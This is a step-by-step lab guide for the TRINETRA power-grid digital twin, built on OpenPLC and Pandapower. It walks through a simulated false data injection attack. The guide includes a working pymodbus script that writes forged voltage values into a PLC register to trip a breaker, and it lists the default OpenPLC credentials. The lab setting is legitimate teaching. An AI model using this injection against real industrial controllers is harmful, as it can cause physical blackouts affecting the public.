# TRINETRA: Step-by-Step Execution & Cyber-Attack Guide

This guide details exactly how to start the full TRINETRA Digital Twin, construct a valid cyber-physical grid, deploy the logic via OpenPLC, and execute a false data injection (FDIA) attack to verify the physical blackout.

---

## Part 1: Starting the Engine & UI

1.  **Terminal 1 (Backend - Physics & Modbus Engine):**
    ```bash
    cd ~/project-trinetra/backend-orchestrator
    source venv/bin/activate
    uvicorn main:app --host 0.0.0.0 --port 8000
    ```

2.  **Terminal 2 (Frontend - React Builder):**
    ```bash
    cd ~/project-trinetra/digital-twin-builder
    npm run dev
    ```

3.  Open your browser to `http://localhost:5173`.

---

## Part 2: Building the Topology

To observe a blackout, you must build a grid where a single breaker controls flow to a load.

1.  **Draw the Physics:**
    *   Drag **Bus 1** and **Bus 2** onto the canvas.
    *   Drag **External Grid** and connect it to **Bus 1**.
    *   Drag **Circuit Breaker** and connect it *between* Bus 1 and Bus 2.
    *   Drag **Load** and connect it to **Bus 2**.
2.  **Draw the Cyber:**
    *   Drag an **IED** node and connect it to the **Circuit Breaker**.
3.  **Configure ST Logic (Optional but Recommended):**
    *   Double-click the **IED**. You can leave the ST Code box blank (it will auto-generate the Distance Protection logic), or you can paste the strict IEC 61131-3 logic provided in the OpenPLC Integration Guide.
    *   **Sample Confirmed ST Code:**
        ```pascal
        PROGRAM user_distance_relay
          VAR
            V_scaled AT %MW0 : UINT := 23000;
            I_scaled AT %MW1 : UINT := 1520;
            scan_count AT %QW24 : INT := 0;
            Trip_Command_0 AT %QX0.0 : BOOL := FALSE;
          END_VAR

          IF scan_count >= 32767 THEN
            scan_count := 0;
          ELSE
            scan_count := scan_count + 1;
          END_IF;

          IF V_scaled > 25000 THEN
            Trip_Command_0 := TRUE;
          ELSE
            Trip_Command_0 := FALSE;
          END_IF;

        END_PROGRAM

        CONFIGURATION Config0
          RESOURCE Res0 ON PLC
            TASK Task0(INTERVAL := T#500ms, PRIORITY := 0);
            PROGRAM Inst0 WITH Task0 : user_distance_relay;
          END_RESOURCE
        END_CONFIGURATION
        ```

---

## Part 3: Deployment & Verification

1.  Click **Deploy Architecture** in the React UI.
2.  Switch back to **Terminal 1**. Watch the logs.
    *   You will see the Docker container mapping.
    *   The system will pause for ~30 seconds while `matiec` compiles the `.st` code into C-code.
    *   You will see the Modbus connection established.
3.  **Steady State:** The physics engine will begin its 500ms loops. You will see continuous logs indicating normal flow:
    ```
    INFO - Physics: Voltage=230.0000 pu | Breaker CLOSED | Grid Normal
    ```

### Verify memory in OpenPLC (Optional)
*   Open a new browser tab to `http://localhost:8080`.
*   Login (`openplc` / `openplc`).
*   Go to **Monitoring**. You will see `V_scaled` happily holding exactly `23000` (which is Pandapower's 230V scaled up).

---

## Part 4: Executing the False Data Injection Attack

You will now act as a rogue actor on the substation network. We will inject a fake analog value into OpenPLC's memory, forcing it to trip the breaker.

1.  Open **Terminal 3**.
2.  Create the attack script:
    ```bash
    cat << 'EOF' > /tmp/hack.py
    from pymodbus.client import ModbusTcpClient
    import time
    
    # 5020 is the default external Modbus port mapped to the first IED
    c = ModbusTcpClient("127.0.0.1", port=5020) 
    c.connect()
    
    # Inject 260V (26000) into Holding Register 1024 (%MW0 offset in OpenPLC)
    # Spam it for 2.5 seconds to ensure we win the execution race condition
    for _ in range(50):
        c.write_register(1024, 26000) 
        time.sleep(0.05)
    
    print("ATTACK SUCCESS: Faked voltage telemetry set to 260V")
    c.close()
    EOF
    ```
3.  **Execute the attack:**
    ```bash
    python3 /tmp/hack.py
    ```

## Part 5: Observing the Physical Blackout

Instantly switch back to **Terminal 1**. 

Because `%MW0` is now 26000, the OpenPLC logic (`IF V_scaled > 25000 THEN Trip_Command_0 := TRUE;`) will immediately fire. 

The Python orchestrator will read `%QX0.0`, see that it is `TRUE`, and sever the Pandapower switch. Your terminal will instantly change to:

```text
BREAKER breaker_1: TRIPPED (PLC commanded) -> Switch open -> Flow severed
Physics: Voltage=0.0000 pu [BREAKER TRIPPED - PLC protection relay OPEN]
```

Congratulations. You have successfully simulated a cyber-induced physical outage.

---

## Part 6: Understanding the Physics of the Blackout

What exactly happens when the attack is completed? Does Pandapower just start producing universal 0 values? 

**No.** Only the specific Bus *after* the breaker (and everything connected to it) becomes `0V`. Here is exactly how the physics engine handles the attack and why it behaves this way.

**The Physics of the Blackout**
Let's look at the topology we built: `External Feeder -> Bus 1 -> Breaker -> Bus 2 -> Load`.

When the OpenPLC `.st` code sets the `Trip_Command` to `TRUE` because of the cyber-attack, the FastAPI Python script receives that signal and tells Pandapower to physically **open the breaker** in the mathematical model.

Because Pandapower mathematically simulates real electricity, here is exactly what it calculates on the very next 500ms tick:

1. **Bus 1 (The Source Side):** Because Bus 1 is still physically connected to the External Feeder, it remains fully energized. Pandapower will calculate that Bus 1 is still ~230kV.
2. **The Breaker:** The electrical bridge is now severed. Current flowing through the breaker drops to 0 Amps.
3. **Bus 2 (The Load Side):** Because the breaker is open, Bus 2 is now completely isolated from the power source. Pandapower calculates that Bus 2 voltage drops to 0V.
4. **The Load:** Because Bus 2 is at 0V, the load cannot draw any power. Pandapower calculates the load current is 0 Amps.

**Why this makes the Digital Twin realistic:**
If the Python engine just lazily said "The grid was attacked, output 0 for everything," the simulation would be scientifically invalid. 

Instead, if a hacker only attacks IED 1 and trips Breaker 1, but leaves the rest of the network alone, Pandapower will correctly calculate a **partial blackout**. The specific consumers attached to the line after Breaker 1 will see 0 voltage, but the rest of the virtual city attached to other lines will stay perfectly powered.

**How this flows to the UI:**
* **The Python Read:** FastAPI reads the new Pandapower results. It sees Bus 1 = 23000 (scaled) and Bus 2 = 0.
* **The Modbus Write:** FastAPI writes 23000 to Modbus registers for sensors looking at Bus 1, and 0 to sensors looking at Bus 2.
* **The HMI UI:** On the React dashboard, the wire representing Bus 1 will stay glowing Green (Energized), while the wire for Bus 2 and the Load icon will instantly turn Gray or Red (De-energized).
